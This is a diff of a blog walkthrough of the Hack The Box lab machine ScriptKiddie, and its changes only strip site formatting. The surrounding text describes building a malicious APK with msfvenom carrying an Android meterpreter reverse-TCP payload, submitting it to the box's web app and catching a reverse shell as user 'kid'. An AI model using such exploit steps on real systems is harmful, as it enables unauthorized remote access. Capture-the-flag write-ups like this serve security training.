@@ -16,12 +16,12 @@ title: 'Walktrough: HTB ScriptKiddie'
 
 Hello guys!
 
-This week's machine will be **ScriptKiddie**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu), created by [0xdf](https://app.hackthebox.eu/users/4935).<!--more-->
+This week's machine will be **ScriptKiddie**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu), created by [0xdf](https://app.hackthebox.eu/users/4935). [more]
 
-:information_source: **Info**:  Write-ups for Hack The Box machines are posted as soon as they’re retired.
-{: .notice--info}
+:information_source: **Info**:  Write-ups for Hack The Box machines are posted as soon as they're retired.
 
-![HTB ScriptKiddie](https://i.imgur.com/Igno8wu.png){: .align-center}
+
+![HTB ScriptKiddie](https://i.imgur.com/Igno8wu.png)
 
 ## Enumeration
 
@@ -110,11 +110,11 @@ Do: msfvenom -x /tmp/tmpt7qr4ner/evil.apk -p android/meterpreter/reverse_tcp LHO
 
 After obtaining the evil payload, started one listener and selected the options suggested in the payload output, where selecting the android operating system would result in the payload `android/meterpreter/reverse_tcp` we aim to abuse based in the existing vulnerability, as well as specifying the lhost as 127.0.0.1 but this shouldn't impact the way exploit will work.
 
-![Submiting the evil payload](https://i.imgur.com/Nvcj4BA.png){: .align-center}
+![Submiting the evil payload](https://i.imgur.com/Nvcj4BA.png)
 
 After hitting the **Generate** button, a reverse shell was returned, as seen below in this screenshot.
 
-![reverse shell returned](https://i.imgur.com/llt85mf.png){: .align-center}
+![reverse shell returned](https://i.imgur.com/llt85mf.png)
 
 Inspecting the session obtained, with the credentials running the web application, in this case user `kid`, was possible to obtain the user flag, as the file resided in it's home directory.
 
